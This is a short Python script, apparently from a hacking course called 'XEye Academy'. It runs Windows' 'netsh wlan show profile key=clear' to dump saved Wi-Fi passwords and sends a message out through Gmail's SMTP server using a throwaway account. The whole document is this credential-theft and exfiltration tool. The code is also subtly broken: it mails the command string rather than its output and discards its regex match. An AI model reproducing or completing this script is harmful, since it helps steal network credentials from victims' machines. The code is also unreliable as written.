#! /usr/bin/env python3
import re,smtplib,subprocess,time
def smail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

cmd = "netsh wlan show profile key=clear"
networks = subprocess.check_output(cmd)
networkss = re.search("(?:Profile\s*:\s)(.*)",str(networks))
em = input("[Required] --> Enter your fake email: ")
pas = input("[Required] --> Enter the password: ")
print(" XEye Academy --> https://academy.XEyecs.com ")
smail(em,pas,cmd)
